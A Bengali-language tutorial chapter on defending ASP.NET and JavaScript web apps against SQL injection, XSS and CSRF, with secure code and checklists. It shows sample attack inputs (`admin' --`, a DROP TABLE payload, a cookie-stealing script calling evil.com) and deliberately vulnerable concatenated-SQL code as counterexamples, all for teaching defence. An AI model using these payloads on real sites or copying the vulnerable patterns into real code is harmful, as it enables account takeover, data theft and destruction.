# Chapter ১৬: SQL Injection ও XSS Protection

> ⚠️ এই chapter-এ আক্রমণ বোঝানো হয়েছে **প্রতিরক্ষার উদ্দেশ্যে**। শুধু নিজের বা অনুমোদিত সিস্টেমে পরীক্ষা করুন।

দুটিই **Injection** শ্রেণির আক্রমণ — মূল কারণ এক: **ব্যবহারকারীর input-কে "data" না ভেবে "কোড" হিসেবে চালিয়ে ফেলা**। দুটিই OWASP Top 10-এ নিয়মিত থাকে।

---

## ভাগ ১: SQL Injection (SQLi)

### ১. কী?

আক্রমণকারী input-এর মাধ্যমে **নিজের SQL কোড** query-তে ঢুকিয়ে দেয়, ফলে database তার ইচ্ছামতো কাজ করে।

### ২. দুর্বল কোড ❌

```csharp
// string জোড়া লাগানো — ভয়ংকর!
var sql = "SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'";
```

আক্রমণকারী username-এ লেখে: `admin' --`

```sql
SELECT * FROM Users WHERE Username = 'admin' --' AND Password = ''
```
`--` মানে comment → password শর্ত বাতিল → **password ছাড়াই admin হিসেবে login!** 😱

### ৩. কী কী ক্ষতি হতে পারে?

| ক্ষতি | ব্যাখ্যা |
|---|---|
| Authentication এড়ানো | অন্যের account-এ ঢোকা |
| Data চুরি | সব user-এর তথ্য, কার্ড, ইমেইল |
| Data বদল/মুছে ফেলা | `'; DROP TABLE Users; --` |
| সম্পূর্ণ সার্ভার দখল | কিছু ক্ষেত্রে (`xp_cmdshell` চালু থাকলে) |

### ৪. প্রতিরক্ষা ✅

#### ক) Parameterized Query — **সবচেয়ে গুরুত্বপূর্ণ** ⭐

Input আলাদা **parameter** হিসেবে যায়; database কখনো সেটিকে SQL কোড হিসেবে পড়ে না।

```csharp
const string sql = "SELECT * FROM Users WHERE Username = @Username";
await using var cmd = new SqlCommand(sql, conn);
cmd.Parameters.Add("@Username", SqlDbType.NVarChar, 100).Value = username;
```

#### খ) Stored Procedure (সঠিকভাবে)

```sql
CREATE PROCEDURE usp_GetUser @Username NVARCHAR(100)
AS SELECT Id, Name FROM Users WHERE Username = @Username;
```
> ⚠️ Stored procedure-এর ভেতরেও string জোড়া দিয়ে dynamic SQL বানালে (`EXEC('...' + @x)`) **একই ঝুঁকি**। Dynamic SQL লাগলে `sp_executesql` + parameter ব্যবহার করুন।

#### গ) ORM (Entity Framework / Dapper) — parameter স্বয়ংক্রিয়

```csharp
// ✅ নিরাপদ (LINQ)
var user = await _db.Users.FirstOrDefaultAsync(u => u.Username == username);

// ✅ নিরাপদ (interpolated — EF Core এটিকে parameter করে)
var users = await _db.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}").ToListAsync();

// ❌ বিপজ্জনক
var bad = await _db.Users.FromSqlRaw("SELECT * FROM Users WHERE Username = '" + username + "'").ToListAsync();

// ✅ Dapper
var user = await conn.QueryFirstOrDefaultAsync<User>(
    "SELECT * FROM Users WHERE Username = @username", new { username });
```

#### ঘ) ORDER BY / টেবিল নামে — Whitelist
Column বা টেবিল নাম parameter করা যায় না। তাই **অনুমোদিত তালিকার সাথে মেলান**:

```csharp
var allowed = new Dictionary<string, string>
{
    ["name"] = "Name", ["date"] = "CreatedAt"
};
var column = allowed.GetValueOrDefault(sortBy, "Name");   // অজানা হলে ডিফল্ট
var sql = $"SELECT * FROM Orders ORDER BY {column}";
```

#### ঙ) আরও স্তর (Defense in Depth)

- **Least Privilege:** app-এর DB user-কে শুধু প্রয়োজনীয় অধিকার (`db_owner` নয়, `DROP` নয়)
- Input **validation** (ধরন, দৈর্ঘ্য, ফরম্যাট)
- **Error message** ব্যবহারকারীকে দেখাবেন না (table/column নাম ফাঁস হয়) — generic message + ভেতরে log
- **WAF** (অতিরিক্ত স্তর, একমাত্র প্রতিরক্ষা নয়)
- Password **hash** করে রাখুন (BCrypt/Argon2)

---

## ভাগ ২: XSS (Cross-Site Scripting)

### ১. কী?

আক্রমণকারী ওয়েবসাইটে **দূষিত JavaScript** ঢুকিয়ে দেয়, যা **অন্য ব্যবহারকারীর browser-এ** সাইটের নামেই চলে।

### ২. উদাহরণ

Comment বক্সে কেউ লিখল:
```html
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
```
Site সরাসরি comment দেখালে, যে-ই পেজ খুলবে তার cookie/token আক্রমণকারীর কাছে যাবে।

### ৩. XSS-এর ধরন

| ধরন | কীভাবে | উদাহরণ |
|---|---|---|
| **Stored (Persistent)** | দূষিত কোড **DB-তে সংরক্ষিত**, সবাইকে আক্রমণ করে | Comment, profile, order note |
| **Reflected** | কোড URL/ফর্মে, সাথে সাথে উত্তরে প্রতিফলিত | `?search=<script>...` লিংক |
| **DOM-based** | Client-side JS নিজেই বিপজ্জনকভাবে DOM-এ লেখে | `innerHTML = location.hash` |

### ৪. কী ক্ষতি?

- Session cookie / JWT চুরি → account দখল
- ব্যবহারকারীর হয়ে কাজ করা (ট্রান্সফার, পাসওয়ার্ড বদল)
- ভুয়া login ফর্ম দেখানো (phishing)
- Keylogging, redirect

### ৫. প্রতিরক্ষা ✅

#### ক) **Output Encoding** — মূল প্রতিরক্ষা ⭐
Data দেখানোর সময় `<` `>` `"` `&` কে নিরাপদ রূপে (`&lt;` `&gt;`...) রূপান্তর, যাতে browser কোড হিসেবে না পড়ে।

**Razor (ASP.NET Core MVC)** — ডিফল্টভাবে encode করে:
```cshtml
<p>@Model.Comment</p>              @* ✅ স্বয়ংক্রিয় encode *@
<p>@Html.Raw(Model.Comment)</p>    @* ❌ বিপজ্জনক — encode বন্ধ *@
```
> `Html.Raw` শুধু বিশ্বস্ত ও স্যানিটাইজড কনটেন্টে।

**Angular** — ডিফল্টভাবে sanitize করে:
```html
<p>{{ comment }}</p>               <!-- ✅ নিরাপদ -->
<p [innerHTML]="comment"></p>      <!-- Angular sanitize করে, তবুও সাবধান -->
```
`bypassSecurityTrustHtml()` এড়িয়ে চলুন।

**jQuery** (আপনার QISSLAB-এর মতো প্রকল্পে সাধারণ ভুল):
```javascript
$('#msg').html(userInput);    // ❌ XSS ঝুঁকি
$('#msg').text(userInput);    // ✅ নিরাপদ
```
**DataTables-এ** `render` ফাংশনে user data বসালে encode করুন:
```javascript
{ data: 'name', render: $.fn.dataTable.render.text() }   // ✅ HTML escape করে
```

#### খ) Context অনুযায়ী Encoding

| কোথায় বসছে | কী encode |
|---|---|
| HTML body | HTML encode |
| HTML attribute | Attribute encode (সবসময় quote ব্যবহার) |
| JavaScript | JS encode |
| URL | URL encode |

#### গ) **Content Security Policy (CSP)** — শক্তিশালী দ্বিতীয় স্তর ⭐
Browser-কে বলে কোথা থেকে script চলতে পারবে।

```csharp
app.Use(async (ctx, next) =>
{
    ctx.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'";
    ctx.Response.Headers["X-Content-Type-Options"] = "nosniff";
    ctx.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    await next();
});
```
Inline `<script>` তখন চলবে না → বেশিরভাগ XSS অকার্যকর।

#### ঘ) Cookie সুরক্ষা

```csharp
options.Cookie.HttpOnly = true;                           // JS পড়তে পারবে না
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // শুধু HTTPS
options.Cookie.SameSite = SameSiteMode.Strict;            // CSRF কমায়
```
XSS হলেও `HttpOnly` cookie চুরি যায় না।

#### ঙ) Input Validation ও Sanitization
- ধরন, দৈর্ঘ্য, ফরম্যাট যাচাই (Whitelist)
- Rich text (HTML) দিতেই হলে **HtmlSanitizer** লাইব্রেরি
- Validation **সাহায্যকারী**, প্রধান প্রতিরক্ষা **output encoding**

#### চ) অন্যান্য
- Framework আপডেট রাখুন
- `eval()`, `document.write()`, `innerHTML` এড়ান
- Third-party script সীমিত ও Subresource Integrity (SRI)

---

## ভাগ ৩: সম্পর্কিত — CSRF (সংক্ষেপে)

**CSRF (Cross-Site Request Forgery):** আপনি লগইন করা থাকলে, দূষিত সাইট আপনার browser দিয়ে অন্য সাইটে অনুরোধ পাঠায়।

**প্রতিরক্ষা:** Anti-forgery token (`[ValidateAntiForgeryToken]`), `SameSite` cookie, JWT Bearer header (cookie নয়) ব্যবহার করলে স্বাভাবিকভাবেই কম ঝুঁকি।

```csharp
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult Update(ProfileModel model) { ... }
```

---

## ৪. SQLi বনাম XSS

| | SQL Injection | XSS |
|---|---|---|
| লক্ষ্য | **Database / Server** | **অন্য ব্যবহারকারীর Browser** |
| ইনজেক্ট হয় | SQL কোড | JavaScript/HTML |
| মূল প্রতিরক্ষা | **Parameterized Query** | **Output Encoding + CSP** |
| ফলাফল | Data চুরি/ধ্বংস | Session চুরি, impersonation |

---

## ৫. Professional Security Checklist ✅

**SQL Injection**
- [ ] সব query parameterized (ORM/Dapper/ADO.NET parameters)
- [ ] Dynamic SQL-এ whitelist
- [ ] DB user-এর ন্যূনতম অধিকার
- [ ] Error বিস্তারিত ব্যবহারকারীকে দেখানো হয় না

**XSS**
- [ ] সব output encoded (`Html.Raw`/`.html()`/`innerHTML` এড়ানো)
- [ ] CSP header চালু
- [ ] Cookie: `HttpOnly`, `Secure`, `SameSite`
- [ ] Rich text-এ sanitizer

**সাধারণ**
- [ ] HTTPS সর্বত্র ([Chapter ১৪](14-https-and-tls.md))
- [ ] Dependency নিয়মিত আপডেট ও স্ক্যান ([CI/CD](13-ci-cd.md))
- [ ] Security header (`X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`)
- [ ] নিয়মিত Security test (OWASP ZAP, Code review)

---

## ৬. সাধারণ ভুল

| ভুল | সমাধান |
|---|---|
| "ফ্রন্টএন্ডে validation আছে, যথেষ্ট" | **Backend-এও** আবশ্যক; frontend এড়ানো যায় |
| Blacklist (`<script>` মুছে ফেলা) | Whitelist + Encoding |
| `FromSqlRaw` + string concatenation | `FromSqlInterpolated` / parameter |
| `.html(userData)` / `Html.Raw` | `.text()` / ডিফল্ট encoding |
| Error-এ stack trace/SQL দেখানো | Generic message, ভেতরে log |
| DB-তে `sa`/`db_owner` দিয়ে সংযোগ | Least privilege user |

---

## ✅ সারসংক্ষেপ

- দুটিরই মূল: **User input-কে কোড হিসেবে চালানো**
- **SQLi → Parameterized Query**
- **XSS → Output Encoding + CSP + HttpOnly Cookie**
- একটি স্তরে ভরসা নয় — **Defense in Depth**

⬅️ [JWT ও OAuth 2.0](15-jwt-and-oauth2.md) | 🏠 [README](README.md)
